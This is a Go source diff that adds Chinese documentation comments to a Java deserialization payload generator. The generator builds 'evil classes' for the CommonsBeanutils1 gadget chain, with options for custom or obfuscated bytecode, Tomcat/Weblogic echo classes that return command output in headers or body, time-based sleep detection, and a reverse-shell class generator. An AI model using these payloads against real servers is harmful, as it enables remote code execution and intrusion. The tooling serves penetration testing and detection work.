@@ -483,31 +483,71 @@ type GenClassOptionFun func(config *ClassConfig)
 //	SetClassModifyTomcatMaxHeaderSizeTemplate(),
 //}
 
-// 公共参数
+// SetClassName
+//
+// evilClassName 请求参数选项函数，用于设置生成的类名。
+//
+// className：要设置的类名。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
 func SetClassName(className string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassName = className
 	}
 }
 
+// SetConstruct
+//
+// useConstructorExecutor 请求参数选项函数，用于设置是否使用构造器执行。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
 func SetConstruct() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.IsConstruct = true
 	}
 }
+
+// SetObfuscation
+// obfuscationClassConstantPool 请求参数选项函数，用于设置是否混淆类常量池。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
 func SetObfuscation() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.IsObfuscation = true
 	}
 }
 
-// 生成自定义Class
+// SetBytesEvilClass
+// useBytesEvilClass 请求参数选项函数，传入自定义的字节码。
+//
+// data：自定义的字节码。
+//
+// Example:
+//
+// bytesCode,_ =codec.DecodeBase64(bytes)
+//
+// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
 func SetBytesEvilClass(data []byte) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = BytesClass
 		config.ClassBytes = data
 	}
 }
+
+// SetClassBase64Bytes
+// useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。
+//
+// base64：base64编码的字节码。
+//
+// Example:
+//
+// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
 func SetClassBase64Bytes(base64 string) GenClassOptionFun {
 	bytes, err := codec.DecodeBase64(base64)
 	if err != nil {
@@ -516,6 +556,17 @@ func SetClassBase64Bytes(base64 string) GenClassOptionFun {
 	}
 	return SetClassBytes(bytes)
 }
+
+// SetClassBytes
+// useBytesClass 请求参数选项函数，传入字节码。
+//
+// data：字节码。
+//
+// Example:
+//
+// bytesCode,_ =codec.DecodeBase64(bytes)
+//
+// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
 func SetClassBytes(data []byte) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = BytesClass
@@ -867,7 +918,7 @@ func SetClassSpringEchoTemplate() GenClassOptionFun {
 
 // SetHeader
 // springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。
-//
+// 需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。
 // key：要设置的 header 键。
 //
 // val：要设置的 header 值。
@@ -1154,84 +1205,207 @@ func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOpt
 }
 
 // SetClassTomcatEchoTemplate
-// useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 tomcatEchoHost 和 tomcatEchoPort 使用。
-// 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
+//
+// useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
 //
 // Example:
 //
-// host = "公网IP"
+// body 回显
+// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
 //
-// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.tomcatEchoHost(host),yso.tomcatEchoPort(8080))
+// header 回显
+// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 func SetClassTomcatEchoTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TomcatEchoClass
 	}
 }
 
+// SetTomcatEchoEvilClass
+// useTomcatEchoEvilClass 请求参数选项函数，设置 TomcatEcho 类，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
+// 和 useTomcatEchoTemplate 的功能一样
+//
+// Example:
+//
+// body 回显
+// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
+//
+// header 回显
+// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 func SetTomcatEchoEvilClass() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TomcatEchoClass
 	}
 }
+
+// GenTomcatEchoClassObject
+//
+// GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// body 回显
+// bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
+//
+// header 回显
+// headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
 func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
 	config.ClassType = TomcatEchoClass
 	return config.GenerateClassObject()
 }
 
-// MultiEcho
+// SetClassMultiEchoTemplate
+//
+// useClassMultiEchoTemplate 请求参数选项函数，用于设置生成 MultiEcho 类的模板，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
+//
+// Example:
+//
+// body 回显
+// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
+//
+// header 回显
+// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 func SetClassMultiEchoTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = MultiEchoClass
 	}
 }
 
+// SetMultiEchoEvilClass
+// useMultiEchoEvilClass 请求参数选项函数，设置 MultiEcho 类，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
+// 和 useClassMultiEchoTemplate 的功能一样
+//
+// Example:
+//
+// body 回显
+// bodyClassObj,_ =  yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
+//
+// header 回显
+// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 func SetMultiEchoEvilClass() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = MultiEchoClass
 	}
 }
+
+// GenMultiEchoClassObject
+//
+// GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// body 回显
+// bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
+//
+// header 回显
+// headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
 func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
 	config.ClassType = MultiEchoClass
 	return config.GenerateClassObject()
 }
 
-// HeaderEchoClass
+// SetClassHeaderEchoTemplate
+//
+// useHeaderEchoTemplate 请求参数选项函数，用于设置生成HeaderEcho类的模板，需要配合 useHeaderParam 使用。
+// 自动查找Response对象并在header中回显指定内容，需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 func SetClassHeaderEchoTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = HeaderEchoClass
 	}
 }
 
+// SetHeaderEchoEvilClass
+// useHeaderEchoEvilClass 请求参数选项函数，设置 HeaderEcho 类，需要配合 useHeaderParam 使用。
+// 和 useHeaderEchoTemplate 的功能一样
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 func SetHeaderEchoEvilClass() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = HeaderEchoClass
 	}
 }
+
+// GenHeaderEchoClassObject
+//
+// GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
 func GenHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
 	config.ClassType = HeaderEchoClass
 	return config.GenerateClassObject()
 }
 
-// SleepClass
+// SetClassSleepTemplate
+//
+// useSleepTemplate 请求参数选项函数，用于设置生成 Sleep 类的模板，需要配合 useSleepTime 使用，主要用与指定 sleep 时长，用于延时检测gadget。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 func SetClassSleepTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = SleepClass
 	}
 }
 
+// SetSleepEvilClass
+// useSleepEvilClass 请求参数选项函数，设置 Sleep 类，需要配合 useSleepTime 使用。
+// 和 useSleepTemplate 的功能一样
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 func SetSleepEvilClass() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = SleepClass
 	}
 }
+
+// GenSleepClassObject
+// GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// yso.GenerateSleepClassObject(yso.useSleepTime(5))
 func GenSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
 	config.ClassType = SleepClass
 	return config.GenerateClassObject()
 }
+
+// SetSleepTime
+// useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 func SetSleepTime(time int) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.SleepTime = time
